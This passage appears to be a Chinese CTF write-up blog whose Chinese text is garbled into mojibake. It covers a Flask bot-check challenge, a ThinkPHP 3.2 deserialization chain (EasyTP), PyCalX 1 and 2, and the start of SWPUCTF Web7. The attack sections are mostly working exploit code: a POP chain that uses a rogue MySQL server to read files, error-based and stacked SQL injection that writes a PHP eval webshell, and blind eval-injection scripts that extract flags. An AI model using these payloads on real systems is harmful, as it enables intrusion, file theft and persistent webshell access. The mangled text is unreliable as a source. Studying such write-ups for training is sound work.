@app.route(\u0026#39;/post\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def add_post(): title = request.form.get(\u0026#39;title\u0026#39;, \u0026#39;[no title]\u0026#39;) content = request.form.get(\u0026#39;content\u0026#39;, \u0026#39;[no content]\u0026#39;) name = request.form.get(\u0026#39;author\u0026#39;, \u0026#39;anonymous\u0026#39;)[:10] try: check_result = check_bot(content) if not check_result.endswith(\u0026#39;Human\u0026#39;): flash(\u0026#34;reject because %s or hacker\u0026#34; % (check_result)) return redirect(\u0026#39;/\u0026#39;) post_storage.append( {\u0026#39;title\u0026#39;: title, \u0026#39;content\u0026#39;: content, \u0026#39;author\u0026#39;: name, \u0026#39;date\u0026#39;: datetime.now().strftime(\u0026#34;%B %d, %Y %X\u0026#34;)}) session[\u0026#39;name\u0026#39;] = name except Exception as e: flash(\u0026#39;Something wrong, contact admin.\u0026#39;) return redirect(\u0026#39;/\u0026#39;) @app.route(\u0026#39;/admin/model_download\u0026#39;) def model_download(): \u0026#39;\u0026#39;\u0026#39; Download current model. \u0026#39;\u0026#39;\u0026#39; if session.get(\u0026#39;admin\u0026#39;, True): try: with zipfile.ZipFile(\u0026#34;temp.zip\u0026#34;, \u0026#39;w\u0026#39;) as z: for e in [\u0026#39;detection.meta\u0026#39;, \u0026#39;detection.index\u0026#39;, \u0026#39;detection.data-00000-of-00001\u0026#39;]: z.write(\u0026#39;tf/detection_model/\u0026#39; + e, arcname=e) return send_file(\u0026#34;temp.zip\u0026#34;, as_attachment=True, attachment_filename=\u0026#39;model.zip\u0026#39;) except Exception as e: flash(str(e)) return redirect(\u0026#39;/admin\u0026#39;) else: return \u0026#34;Not a admin **session**. \u0026lt;a href=\u0026#39;/\u0026#39;\u0026gt;Back\u0026lt;/a\u0026gt;\u0026#34; @app.route(\u0026#39;/admin\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def ad in(): global site_description, site_title, sess if session.get(\u0026#39;admin\u0026#39;, False): print(\u0026#39;admin session.\u0026#39;) if request.method == \u0026#39;POST\u0026#39;: if request.form.get(\u0026#39;site_description\u0026#39;): site_description = request.form.get(\u0026#39;site_description\u0026#39;) if request.form.get(\u0026#39;site_title\u0026#39;): site_title = request.form.get(\u0026#39;site_title\u0026#39;) if request.files.get(\u0026#39;modelFile\u0026#39;): file = request.files.get(\u0026#39;modelFile\u0026#39;) # print(file, type(file)) try: z = zipfile.ZipFile(file=file) for e in [\u0026#39;detection.meta\u0026#39;, \u0026#39;det ction.index\u0026#39;, \u0026#39;detection.data-00000-of-00001\u0026#39;]: open(\u0026#39;tf/detection_model/\u0026#39; + e, \u0026#39;wb\u0026#39;).write(z.read(e)) sess = renew(sess, tf_path) flash(\u0026#34;Reloaded succe sfully\u0026#34;) except Exception as e: flash(str(e)) return render_template(\u0026#39;admin.html\u0026#39;) else: return \u0026#34;Not a admin **session**. \u0026lt;a href=\u0026#39;/\u0026#39;\u0026gt;Back\u0026lt;/a\u0026gt;\u0026#34; @app.route(\u0026#39;/admin/source\u0026#39;) # \u0026lt;--here â™‚ boy next door def get_source(): return open(\u0026#39;app.py\u0026#39;, encoding=\u0026#39;utf8\u0026#39;).read() @app.route(\u0026#39;/admin/source_thanos\u0026#39;) def get_source_broken(): \u0026#39;\u0026#39;\u0026#39; Thanos is eventually resurrected,[21] and collects the Infinity Gems once again.[22] He uses the gems to create the Infinity Gauntlet, making himself omnipotent, and erases half the living things in the universe to prove his love to Death. \u0026#39;\u0026#39;\u0026#39; t = open(\u0026#39;app.py\u0026#39;, encoding=\u0026#39;utf8\u0026#39;).read() tt = [t[i] for i in range(len(t))] ll = list(range(len(t))) random.shuffle(ll) for i in ll[:len(t) // 2]: if tt[i] != \u0026#39;\\n\u0026#39;: tt[i] = \u0026#39; \u0026#39; return \u0026#34;\u0026#34;.join(tt) â€¦â€¦tensorflowï¼Œå®Œå…¨ä¸æ‡‚å•Šå“¥ï¼Œä½ è€ƒçš„çŸ¥è¯†å¤ªé«˜é›…äº†ï¼Œæˆ‘ä¿—äººä¸€ä¸ªï¼Œå’‹å°±è¾“å…¥ä¸€ä¸ªaaaaaabxCZCå°±æœ‰flagäº†å•Š\nä½œè€…wp\n[çº¢æ˜è°·CTF 2021]EasyTP | tp3.2 ååºåˆ—åŒ– mysqlä¼ªæœåŠ¡ç«¯ sqli æŠ¥é”™æ³¨å…¥ å †å æ³¨å…¥ è„±åº“ tp3.2.3ï¼Œæœ‰ä¸€ä¸ªç°æˆçš„é“¾å­ï¼šThinkPHP v3.2.* ï¼ˆSQLæ³¨å…¥\u0026amp;æ–‡ä»¶è¯»å–ï¼‰ååºåˆ—åŒ–POPé“¾\nçœ‹Application\\Home\\Controller\\IndexController.class.phpçš„ä»£ç ä¹Ÿè·Ÿè¿™ä¸ªæ–‡ç« ä¸­çš„ç¤ºä¾‹ä»£ç å¤§å·®ä¸å·®ï¼Œé¡ºç€è¿™ç¯‡æ–‡ç« çš„æ€è·¯è·Ÿä¸€ä¸‹\né¦–å…ˆæ˜¯å…¨å±€å¯»æ‰¾__destruct()å‡½æ•°\nwww/ThinkPHP/Library/Think/Image/Driver/Imagick.class.php\nå¯»æ‰¾ä¸€ä¸ªdestroy()\nwww/ThinkPHP/Library/Think/Session/Driver/Memcache.class.php\nè¿™é‡Œéœ€è¦ä¸€ä¸ª$sessIDï¼ŒPHP7ä¸‹ä¸ä¼ å‚ä¼šæŠ¥é”™ PHP5ä¸å½±å“ï¼Œ$this-\u0026gt;sessionNameå¯æ§ï¼›æ¥ç€æ‰¾å«æœ‰delete()çš„ç±»\nwww/ThinkPHP/Mode/Lite/Model.class.php\nç›¸å½“äºä¼ å…¥çš„å‚æ•°éƒ½å¯ç”¨ï¼Œå¯ä»¥æ§åˆ¶è‡ªå¸¦çš„æ•°æ®åº“ç±»çš„delete()æ–¹æ³•äº†\nwww/ThinkPHP/Library/Think/Db/Driver.class.php\nå®ƒæ˜¯æ‹¼æ¥äº†$sqlè¯­å¥ï¼Œä¹‹åæ‰§è¡Œ$this-\u0026gt;execute()\nå®ƒä¼šé¢„å…ˆè¿›è¡Œ$this-\u0026gt;initConnect()\næˆ‘ä»¬å¯ä»¥æ§åˆ¶$configï¼Œæ§åˆ¶è¿æ¥ä»»æ„æ•°æ®åº“\nè¿™é‡Œå¯ä»¥ç»“åˆMySQLæ¶æ„æœåŠ¡ç«¯è¯»å®¢æˆ·ç«¯æ–‡ä»¶è¿™ä¸ªæ´äº†ï¼ˆé¢˜ç›®å¯ä»¥å‚è€ƒ[DDCTF 2020]mysqlå¼±å£ä»¤ï¼‰ï¼Œåˆ©ç”¨è¿‡ç¨‹å°±æ˜¯è¿™æ ·ï¼š\né€šè¿‡æŸå¤„æ³„éœ²å¾—åˆ°ç›®æ ‡çš„WEBç›®å½•ï¼ˆå¦‚DEBUGé¡µé¢ å¼€å¯MySQLä¼ªæœåŠ¡ç«¯ï¼Œè¯»å–ç›®æ ‡çš„æ•°æ®åº“é…ç½®æ–‡ä»¶ è§¦å‘ååºåˆ—åŒ– è§¦å‘PDOè¿æ¥éƒ¨åˆ† è·å–åˆ°ç›®æ ‡çš„æ•°æ®åº“é…ç½®æ–‡ä»¶ ä»¥æœ¬é¢˜ä¸ºæ¼”ç¤ºï¼Œä½¿ç”¨bettercapåšmysqlä¼ªæœåŠ¡ç«¯è¯»ä¸€ä¸‹/etc/passwd\n\u0026lt;?php namespace Think\\Db\\Driver{ use PDO; class Mysql{ protected $options = array( PDO::MYSQL_ATTR_LOCAL_INFILE =\u0026gt; true // å¼€å¯æ‰èƒ½è¯»å–æ–‡ä»¶ ); protected $config = array( \u0026#34;debug\u0026#34; =\u0026gt; 1, \u0026#34;database\u0026#34; =\u0026gt; \u0026#34;\u0026#34;, \u0026#34;hostname\u0026#34; =\u0026gt; \u0026#34;your_vps\u0026#34;, \u0026#34;hostport\u0026#34; =\u0026gt; \u0026#34;port\u0026#34;, \u0026#34;charset\u0026#34; =\u0026gt; \u0026#34;utf8\u0026#34;, \u0026#34;username\u0026#34; =\u0026gt; \u0026#34;root\u0026#34;, \u0026#34;password\u0026#34; =\u0026gt; \u0026#34;root\u0026#34; ); } } namespace Think\\Image\\Driver{ use Think\\Session\\Driver\\Memcache; class Imagick{ private $img; public function __construct(){ $this-\u0026gt;img = new Memcache(); } } } namespace Think\\Session\\Driver{ use Think\\Model; class Memcache{ protected $handle; public function __construct(){ $this-\u0026gt;handle = new Model(); } } } namespace Think{ use Think\\Db\\Driver\\Mysql; class Model{ protected $options = array(); protected $pk; protected $data = array(); protected $db = null; public function __construct(){ $this-\u0026gt;db = new Mysql(); $this-\u0026gt;options[\u0026#39;where\u0026#39;] = \u0026#39;\u0026#39;; $this-\u0026gt;pk = \u0026#39;id\u0026#39;; $this-\u0026gt;data[$this-\u0026gt;pk] = array( \u0026#34;table\u0026#34; =\u0026gt; \u0026#34;mysql.user where 1=updatexml(1,concat(0x7e,user(),31) from test.flag),0x7e),1)#\u0026#34;, \u0026#34;where\u0026#34; =\u0026gt; \u0026#34;1=1\u0026#34; ); } } } namespace { echo base64_encode(serialize(new Think\\Image\\Driver\\Imagick())); $curl = curl_init(); curl_setopt_array($curl, array( CURLOPT_URL =\u0026gt; \u0026#34;http://6382172d-0bab-4e87-b434-7d711efad721.node3.buuoj.cn/\u0026#34;, CURLOPT_RETURNTRANSFER =\u0026gt; true, CURLOPT_ENCODING =\u0026gt; \u0026#34;\u0026#34;, CURLOPT_MAXREDIRS =\u0026gt; 10, CURLOPT_TIMEOUT =\u0026gt; 3, CURLOPT_HTTP_VERSION =\u0026gt; CURL_HTTP_VERSION_1_1, CURLOPT_CUSTOMREQUEST =\u0026gt; \u0026#34;POST\u0026#34;, CURLOPT_POSTFIELDS =\u0026gt; base64_encode(serialize(new Think\\Image\\Driver\\Imagick())), CURLOPT_HTTPHEADER =\u0026gt; array( \u0026#34;Postman-Token: 348e180e-5893-4ab4-b1d4-f570d69f228e\u0026#34;, \u0026#34;cache-control: no-cache\u0026#34; ), )); $response = curl_exec($curl); $err = curl_error($curl); curl_close($curl); if ($err) { echo \u0026#34;cURL Error #:\u0026#34; . $err; } else { echo $response; } } çœ‹åˆ°äº†mysqlç”¨æˆ·ï¼Œå¼±å£ä»¤å¯†ç root\nä¹‹åå°±å¯ä»¥æŠŠæˆ‘ä»¬çš„ä¼ªæœåŠ¡ç«¯æ’¤äº†ï¼Œæ¢æˆçœŸæœåŠ¡ç«¯çš„ï¼Œè¿›è¡Œä¸€ä¸ªæ³¨å…¥\nä½¿ç”¨ç›®æ ‡çš„æ•°æ®åº“é…ç½®å†æ¬¡è¿›è¡Œååºåˆ—åŒ– è§¦å‘DELETEè¯­å¥çš„SQLæ³¨å…¥ $this-\u0026gt;data[$this-\u0026gt;pk] = array( // \u0026#34;table\u0026#34; =\u0026gt; \u0026#34;mysql.user where 1=updatexml(1,concat(0x7e,(select left(group_concat(schema_name),31) from information_schema.SCHEMATA)),1)#\u0026#34;, // \u0026#34;table\u0026#34; =\u0026gt; \u0026#34;mysql.user where 1=updatexml(1,concat(0x7e,(select right(group_concat(schema_name),31) from information_schema.SCHEMATA)),1)#\u0026#34;, // \u0026#34;table\u0026#34; =\u0026gt; \u0026#34;mysql.user where 1=updatexml(1,concat(0x7e,(select left(group_concat(table_name),31) from information_schema.tables where table_schema=\u0026#39;test\u0026#39;),0x7e),1)#\u0026#34;, // \u0026#34;table\u0026#34; =\u0026gt; \u0026#34;mysql.user where 1=updatexml(1,concat(0x7e,(select left(group_concat(column_name),31) from information_schema.columns where table_schema=\u0026#39;test\u0026#39;),0x7e),1)#\u0026#34;, // \u0026#34;table\u0026#34; =\u0026gt; \u0026#34;mysql.user where 1=updatexml(1,concat(0x7e,(select left(group_concat(flag),31) from test.flag),0x7e),1)#\u0026#34;, \u0026#34;table\u0026#34; =\u0026gt; \u0026#34;mysql.user where 1=updatexml(1,concat(0x7e,(select right(group_concat(flag),31) from test.flag),0x7e),1)#\u0026#34;, \u0026#34;where\u0026#34; =\u0026gt; \u0026#34;1=1\u0026#34; ); æˆ‘ä»¬è¿˜å¯ä»¥æŠŠå †å æ‰“å¼€ï¼Œç”¨å †å æ³¨å…¥å†™shellï¼Œä¹Ÿå°±æ˜¯æœ¬é¢˜çš„expï¼ˆå‚è€ƒèµµæ€»çš„exp èµµæ€»ç‰›é€¼\n\u0026lt;?php namespace Think\\Db\\Driver{ use PDO; class Mysql{ protected $options = array( PDO::MYSQL_ATTR_LOCAL_INFILE =\u0026gt; true , // å¼€å¯æ‰èƒ½è¯»å–æ–‡ä»¶ PDO::MYSQL_ATTR_MULTI_STATEMENTS =\u0026gt; true, // æ‰“å¼€å †å æ³¨å…¥ ); protected $config = array( \u0026#34;debug\u0026#34; =\u0026gt; 1, \u0026#34;database\u0026#34; =\u0026gt; \u0026#34;\u0026#34;, \u0026#34;hostname\u0026#34; =\u0026gt; \u0026#34;127.0.0.1\u0026#34;, \u0026#34;hostport\u0026#34; =\u0026gt; \u0026#34;3306\u0026#34;, \u0026#34;charset\u0026#34; =\u0026gt; \u0026#34;utf8\u0026#34;, \u0026#34;username\u0026#34; =\u0026gt; \u0026#34;root\u0026#34;, // çŒœå‡ºå¼±å£ä»¤ \u0026#34;password\u0026#34; =\u0026gt; \u0026#34;root\u0026#34; ); } } namespace Think\\Image\\Driver{ use Think\\Session\\Driver\\Memcache; class Imagick{ private $img; public function __construct(){ $this-\u0026gt;img = new Memcache(); } } } namespace Think\\Session\\Driver{ use Think\\Model; class Memcache{ protected $handle; public function __construct(){ $this-\u0026gt;handle = new Model(); } } } namespace Think{ use Think\\Db\\Driver\\Mysql; class Model{ protected $options = array(); protected $pk; protected $data = array(); protected $db = null; public function __construct(){ $this-\u0026gt;db = new Mysql(); $this-\u0026gt;options[\u0026#39;where\u0026#39;] = \u0026#39;\u0026#39;; $this-\u0026gt;pk = \u0026#39;id\u0026#39;; $this-\u0026gt;data[$this-\u0026gt;pk] = array( // å †å æ³¨å…¥å†™å…¥shell \u0026#34;table\u0026#34; =\u0026gt; \u0026#34;mysql.user where 1=1;select \u0026#39;\u0026lt;?php eval(\\$_POST[amiz]);?\u0026gt;\u0026#39; into outfile \u0026#39;/var/www/html/amiz.php\u0026#39;;#\u0026#34;, \u0026#34;where\u0026#34; =\u0026gt; \u0026#34;1=1\u0026#34; ); } } } namespace { echo base64_encode(serialize(new Think\\Image\\Driver\\Imagick())); $curl = curl_init(); curl_setopt_array($curl, array( CURLOPT_URL =\u0026gt; \u0026#34;http://914146f1-7d08-4a0a-9659-c143df1d68e1.node4.buuoj.cn:81/\u0026#34;, CURLOPT_RETURNTRANSFER =\u0026gt; true, CURLOPT_ENCODING =\u0026gt; \u0026#34;\u0026#34;, CURLOPT_MAXREDIRS =\u0026gt; 10, CURLOPT_TIMEOUT =\u0026gt; 3, CURLOPT_HTTP_VERSION =\u0026gt; CURL_HTTP_VERSION_1_1, CURLOPT_CUSTOMREQUEST =\u0026gt; \u0026#34;POST\u0026#34;, CURLOPT_POSTFIELDS =\u0026gt; base64_encode(serialize(new Think\\Image\\Driver\\Imagick())), CURLOPT_HTTPHEADER =\u0026gt; array( \u0026#34;cache-control: no-cache\u0026#34; ), )); $response = curl_exec($curl); $err = curl_error($curl); curl_close($curl); if ($err) { echo \u0026#34;cURL Error #:\u0026#34; . $err; } else { echo $response; } } å…¶ä¸­curlçš„ä»£ç æ˜¯ç”¨postmanç”Ÿæˆçš„ ~~ï¼ˆpostmanæ‰“é’±ï¼‰~~ä¸€å¥—è¿æ‹›ç›´æ¥å¸¦èµ°ï¼Œç”¨èšå‰‘è¿æ¥ä¹‹åå‘ç°æ ¹ç›®å½•ä¸‹æ²¡æœ‰flagï¼Œåè€Œæ˜¯ä¸€ä¸ªflag.sh\næˆ‘ä»¬è¿˜å¾—è¿ä¸Šæ•°æ®åº“çœ‹çœ‹\nä½†æ˜¯èšå‰‘è‡ªå¸¦çš„æ·»åŠ å¤±è´¥ï¼Œç›´æ¥æ‰‹åŠ¨å†™ä¸€ä¸ªå†°èçš„ğŸ\nç›´æ¥æŸ¥çœ‹ä¹Ÿæ˜¯æ²¡æœ‰ï¼Œä½†æ˜¯å¯ä»¥ç”¨å®ƒçš„å¯¼å‡ºæ•°æ®åº“çš„åŠŸèƒ½å¾—åˆ°æ•°æ®\nå‚è€ƒï¼šwp1 wp2\nPyCalX 1\u0026amp;2 | é¦–å…ˆæ˜¯1\n#!/usr/bin/env python3 import cgi; import sys from html import escape FLAG = open(\u0026#39;/var/www/flag\u0026#39;,\u0026#39;r\u0026#39;).read() OK_200 = \u0026#34;\u0026#34;\u0026#34;Content-type: text/html \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css\u0026#34;\u0026gt; \u0026lt;center\u0026gt; \u0026lt;title\u0026gt;PyCalx\u0026lt;/title\u0026gt; \u0026lt;h1\u0026gt;PyCalx\u0026lt;/h1\u0026gt; \u0026lt;form\u0026gt; \u0026lt;input class=\u0026#34;form-control col-md-4\u0026#34; type=text name=value1 placeholder=\u0026#39;Value 1 (Example: 1 abc)\u0026#39; autofocus/\u0026gt; \u0026lt;input class=\u0026#34;form-control col-md-4\u0026#34; type=text name=op placeholder=\u0026#39;Operator (Example: + - * ** / // == != )\u0026#39; /\u0026gt; \u0026lt;input class=\u0026#34;form-control col-md-4\u0026#34; type=text name=value2 placeholder=\u0026#39;Value 2 (Example: 1 abc)\u0026#39; /\u0026gt; \u0026lt;input class=\u0026#34;form-control col-md-4 btn btn-success\u0026#34; type=submit value=EVAL /\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;a href=\u0026#39;?source=1\u0026#39;\u0026gt;Source\u0026lt;/a\u0026gt; \u0026lt;/center\u0026gt; \u0026#34;\u0026#34;\u0026#34; print(OK_200) arguments = cgi.FieldStorage() if \u0026#39;source\u0026#39; in arguments: source = arguments[\u0026#39;source\u0026#39;].value else: source = 0 if source == \u0026#39;1\u0026#39;: print(\u0026#39;\u0026lt;pre\u0026gt;\u0026#39;+escape(str(open(__file__,\u0026#39;r\u0026#39;).read()))+\u0026#39;\u0026lt;/pre\u0026gt;\u0026#39;) if \u0026#39;value1\u0026#39; in arguments and \u0026#39;value2\u0026#39; in arguments and \u0026#39;op\u0026#39; in arguments: def get_value(val): val = str(val)[:64] if str(val).isdigit(): return int(val) blacklist = [\u0026#39;(\u0026#39;,\u0026#39;)\u0026#39;,\u0026#39;[\u0026#39;,\u0026#39;]\u0026#39;,\u0026#39;\\\u0026#39;\u0026#39;,\u0026#39;\u0026#34;\u0026#39;] # I don\u0026#39;t like tuple, list and dict. if val == \u0026#39;\u0026#39; or [c for c in blacklist if c in val] != []: print(\u0026#39;\u0026lt;center\u0026gt;Invalid value\u0026lt;/center\u0026gt;\u0026#39;) sys.exit(0) return val def get_op(val): val = str(val)[:2] list_ops = [\u0026#39;+\u0026#39;,\u0026#39;-\u0026#39;,\u0026#39;/\u0026#39;,\u0026#39;*\u0026#39;,\u0026#39;=\u0026#39;,\u0026#39;!\u0026#39;] if val == \u0026#39;\u0026#39; or val[0] not in list_ops: print(\u0026#39;\u0026lt;center\u0026gt;Invalid op\u0026lt;/center\u0026gt;\u0026#39;) sys.exit(0) return val op = get_op(arguments[\u0026#39;op\u0026#39;].value) value1 = get_value(arguments[\u0026#39;value1\u0026#39;].value) value2 = get_value(arguments[\u0026#39;value2\u0026#39;].value) if str(value1).isdigit() ^ str(value2).isdigit(): print(\u0026#39;\u0026lt;center\u0026gt;Types of the values don\\\u0026#39;t match\u0026lt;/center\u0026gt;\u0026#39;) sys.exit(0) calc_eval = str(repr(value1)) + str(op) + str(repr(value2)) print(\u0026#39;\u0026lt;div class=container\u0026gt;\u0026lt;div class=row\u0026gt;\u0026lt;div class=col-md-2\u0026gt;\u0026lt;/div\u0026gt;\u0026lt;div class=\u0026#34;col-md-8\u0026#34;\u0026gt;\u0026lt;pre\u0026gt;\u0026#39;) print(\u0026#39;\u0026gt;\u0026gt;\u0026gt;\u0026gt; print(\u0026#39;+escape(calc_eval)+\u0026#39;)\u0026#39;) try: result = str(eval(calc_eval)) if result.isdigit() or result == \u0026#39;True\u0026#39; or result == \u0026#39;False\u0026#39;: print(result) else: print(\u0026#34;Invalid\u0026#34;) # Sorry we don\u0026#39;t support output as a string due to security issue. except: print(\u0026#34;Invalid\u0026#34;) print(\u0026#39;\u0026gt;\u0026gt;\u0026gt; \u0026lt;/pre\u0026gt;\u0026lt;/div\u0026gt;\u0026lt;/div\u0026gt;\u0026lt;/div\u0026gt;\u0026#39;) æ˜¯å®ç°äº†ä¸€ä¸ªè®¡ç®—å™¨ï¼ˆé™¤äº†æ•°å­—è¿˜å¯ä»¥è¿ç®—å­—ç¬¦ä¸²ï¼‰ï¼Œä½†æ˜¯å¯¹å‚æ•°çš„è¿‡æ»¤ä¸Šå¹¶ä¸ä¸¥è°¨\nå¿˜äº†ä½¿ç”¨get_valueå‡½æ•°äº†ï¼Œå¯¼è‡´æˆ‘ä»¬å¯ä»¥ç”¨é»‘åå•é‡Œé¢çš„è¿ç®—ç¬¦çš„ï¼Œç”¨ç±»ä¼¼char-by-char-sqliçš„æ–¹å¼ç›²æ³¨å‡ºflagï¼ˆå› ä¸ºæ²¡æœ‰å›æ˜¾ï¼‰ï¼Œæˆ‘ä»¬å¯æ§çš„å˜é‡æ˜¯sourceï¼ˆä½œç”¨åŸŸæ˜¯å…¨å±€ï¼‰\nimport requests import urllib import string url=\u0026#34;http://eabb9a29-a56e-461e-a0a8-7953b6c243c5.node4.buuoj.cn:81/cgi-bin/pycalx.py?source={0}\u0026amp;value1={1}\u0026amp;op={2}\u0026amp;value2={3}\u0026#34; flag=\u0026#34;\u0026#34; source=\u0026#34;\u0026#34; value1=urllib.parse.quote(\u0026#34;WQERGFD\u0026#34;) op=urllib.parse.quote(\u0026#34;+\u0026#39;\u0026#34;) value2=urllib.parse.quote(\u0026#34; and FLAG\u0026gt;source#\u0026#34;) while True: prev = 0 for i in range(255): if chr(i) in string.printable: source=flag+chr(prev) source=urllib.parse.quote(source) result=requests.get(url.format(source,value1,op,value2)).text #print(result) if \u0026#34;False\u0026#34; in result and \u0026#34;security\u0026#34; not in result: flag+=chr(prev-1) print(flag) break else: prev=i çœ‹ç€è·Ÿsqliå¾ˆåƒï¼Œæ˜¯å­—ç¬¦ä¸²è¿›è¡Œæ¯”è¾ƒï¼Œpythoné»˜è®¤æ¯”å®Œç¬¬ä¸€ä½æ¯”ç¬¬äºŒä½ï¼Œæ‰€ä»¥ä¸éœ€è¦sqlié‚£æ ·æŒ‡åç¬¬å‡ ä½é‚£æ ·ï¼Œæ³¨å…¥å¯ä»¥æ™®é€šfor\nimport requests from requests.api import get from requests.utils import quote import string url = \u0026#39;http://eabb9a29-a56e-461e-a0a8-7953b6c243c5.node4.buuoj.cn:81/cgi-bin/pycalx.py?source={0}\u0026amp;value1={1}\u0026amp;op={2}\u0026amp;value2={3}\u0026#39; flag = \u0026#39;\u0026#39; source = \u0026#39;\u0026#39; value1 = quote(\u0026#39;WQERGFD\u0026#39;) op = quote(\u0026#34;+\u0026#39;\u0026#34;) value2 = quote(\u0026#39; and FLAG\u0026gt;source#\u0026#39;) while True: prev = 0 for i in range(45): if chr(i) in string.printable: source = flag + chr(prev) source = quote(source) resp = requests.get(url.format(source, value1, value2)).text if \u0026#39;False\u0026#39; in resp and \u0026#39;security\u0026#39; not in resp: flag += chr(prev - 1) print(flag) break else: prev = i ä¹Ÿå¯ä»¥äºŒåˆ†ï¼ˆæ„Ÿè§‰è‡ªå·±ä¹‹å‰å†™çš„äºŒåˆ†æ³•çš„è„šæœ¬åº”è¯¥è§£è€¦äº†ï¼Œä¸ç„¶é‡åˆ°è¿™ç§æƒ…å†µçš„è¯éœ€è¦æ”¹çš„åœ°æ–¹å°±å¤ªå¤šäº†ï¼Œåº”è¯¥æ”¹æˆä¸€äº›å‡½æ•°çš„é›†åˆä½“ å°±åƒè¿™ä¸ªå¤§ä½¬çš„ä¸€æ ·\nimport requests, re def calc(v1, v2, op, s): u = \u0026#34;http://178.128.96.203/cgi-bin/server.py?\u0026#34; payload = dict(value1=v1, value2=v2, op=op, source=s) # print payload r = requests.get(u, params=payload) # print r.url res = re.findall(\u0026#34;\u0026lt;pre\u0026gt;\\n\u0026gt;\u0026gt;\u0026gt;\u0026gt;([\\s\\S]*)\\n\u0026gt;\u0026gt;\u0026gt; \u0026lt;\\/pre\u0026gt;\u0026#34;, r.content)[0].split(\u0026#39;\\n\u0026#39;)[1] assert (res != \u0026#39;Invalid\u0026#39;) return res == \u0026#39;True\u0026#39; # print r.content def check(mid): s = flag + chr(mid) return calc(v1, v2, op, s) def bin_search(seq=xrange(0x20, 0x80), lo=0, hi=None): assert (lo \u0026gt;= 0) if hi == None: hi = len(seq) while lo \u0026lt; hi: mid = (lo + hi) // 2 # print lo, mid, hi, \u0026#34;\\t\u0026#34;, if check(seq[mid]): hi = mid else: lo = mid + 1 return seq[lo] flag = \u0026#39;\u0026#39; v1, v2, op, s = \u0026#39;x\u0026#39;, \u0026#34;+FLAG\u0026lt;value1+source#\u0026#34;, \u0026#34;+\u0026#39;\u0026#34;, \u0026#39;\u0026#39; while (1): flag += chr(bin_search() - 1) print flag â€”â€”â€”â€”â€”â€”â€”â€”ä¸‹é¢æ˜¯pycalx2\næŠŠä¸Šé¢çš„opé‚£é‡Œä¹ŸåŠ äº†get_valueå‡½æ•°\nä¸èƒ½ç”¨å•å¼•å·äº†ï¼Œè¿™é‡Œè€ƒçš„åœ°æ–¹æ˜¯f-stringçš„ç‰¹æ€§ï¼Œå¯ä»¥ç›´æ¥æ’å…¥è¿ç®—è¡¨è¾¾å¼ï¼Œä¸è¿‡è¦æ”¹ä¸€ä¸‹è„šæœ¬çš„æ€è·¯\nf\u0026#34;{Flag\u0026gt;source or \u0026#39;e\u0026#39;}\u0026#34; å¦‚æœæˆåŠŸè¾“å‡º1ï¼Œä¸æˆåŠŸè¾“å‡ºeï¼Œæ‹¼æ¥ä¸Šå‰é¢çš„Truï¼ŒæˆåŠŸä¸ºTru1ï¼Œä¸æˆåŠŸä¸ºTrue\nimport requests import urllib import string url=\u0026#34;http://192.168.60.131/cgi-bin/py.py?source={0}\u0026amp;value1={1}\u0026amp;op={2}\u0026amp;value2={3}\u0026#34; flag=\u0026#34;\u0026#34; source=\u0026#34;\u0026#34; value1=urllib.parse.quote(\u0026#34;T\u0026#34;) op=urllib.parse.quote(\u0026#34;+f\u0026#34;) value2=urllib.parse.quote(\u0026#34;ru{FLAG\u0026gt;source or 14:x}\u0026#34;) while True: prev = 0 for i in range(255): if chr(i) in string.printable: source=flag+chr(prev) source=urllib.parse.quote(source) result=requests.get(url.format(source,value1,op,value2)).text #print(result) if \u0026#34;True\u0026#34; in result and \u0026#34;security\u0026#34; not in result: flag+=chr(prev-1) print(flag) break else: prev=i import requests, re def calc(v1, v2, op, s): u = \u0026#34;http://206.189.223.3/cgi-bin/server.py?\u0026#34; payload = dict(value1=v1, value2=v2, op=op, source=s) r = requests.get(u, params=payload) res = re.findall(\u0026#34;\u0026lt;pre\u0026gt;\\n\u0026gt;\u0026gt;\u0026gt;\u0026gt;([\\s\\S]*)\\n\u0026gt;\u0026gt;\u0026gt; \u0026lt;\\/pre\u0026gt;\u0026#34;, r.content)[0].split(\u0026#39;\\n\u0026#39;)[1] return res == \u0026#39;Invalid\u0026#39; def check(mid): s = flag + chr(mid) return calc(v1, v2, op, s) def bin_search(seq=xrange(0x20, 0x80), lo=0, hi=None): assert (lo \u0026gt;= 0) if hi == None: hi = len(seq) while lo \u0026lt; hi: mid = (lo + hi) // 2 if check(seq[mid]): hi = mid else: lo = mid + 1 return seq[lo] flag = \u0026#39;\u0026#39; v1, op, v2, s = \u0026#39;T\u0026#39;, \u0026#34;+f\u0026#34;, \u0026#34;ru{FLAG\u0026lt;source or 14:x}\u0026#34;, \u0026#39;a\u0026#39; while (1): flag += chr(bin_search() - 1) print flag åªç”¨æŠŠä¸Šé¢çš„payloadç¨å¾®é­”æ”¹ä¸€ä¸‹å°±è¡Œï¼Œvalue1=T, op=+f, value2=re{Flag\u0026lt;source or 14:x}, source=xxxxï¼Œä¼ å‚çš„æ—¶å€™ä¸ç”¨åŠ å¼•å·ï¼Œå› ä¸ºå®ƒåœ¨é¢˜ç›®ä¸­è¿ç®—çš„æ—¶å€™ä¼šè‡ªå·±åŠ ä¸Šçš„\nå‚è€ƒï¼šwp | wp2\n[SWPUCTF 2016]Web7 robots.txtçš„æŠ¥é”™æ˜¾ç¤ºè¿™æ˜¯py2.7ï¼Œå¹¶ä¸”æœ‰ä¸€ä¸ªç¬¬ä¸‰æ–¹åº“cherrypy17.4.2ï¼Œé¦–é¡µæ˜¯è¾“å…¥æ¡†ï¼Œè¦æ±‚è¾“å…¥ä¸€ä¸ªurlï¼Œä¹‹åå¯ä»¥è¿”å›å‘å‡ºè¯·æ±‚çš„ä¿¡æ¯ï¼Œä¸‹é¢è¿˜æœ‰ä¸€ä¸ªloginè¾“å…¥å¯†ç ç™»å…¥adminï¼Œæ— å¼±å£ä»¤\nçœ‹æºç çš„æ—¶å€™ç›´æ¥çœ‹åˆ°dockeräº†ï¼Œè€ƒç‚¹æ˜¯cve-2016-5699å’Œredis ssrf\n#!/usr/bin/python # coding:utf8 __author__ = \u0026#39;niexinming\u0026#39; import cherrypy import urllib2 import redis class web7: @cherrypy.expose def index(self): return \u0026#34;\u0026lt;script\u0026gt; window.location.href=\u0026#39;/input\u0026#39;;\u0026lt;/script\u0026gt;\u0026#34; @cherrypy.expose 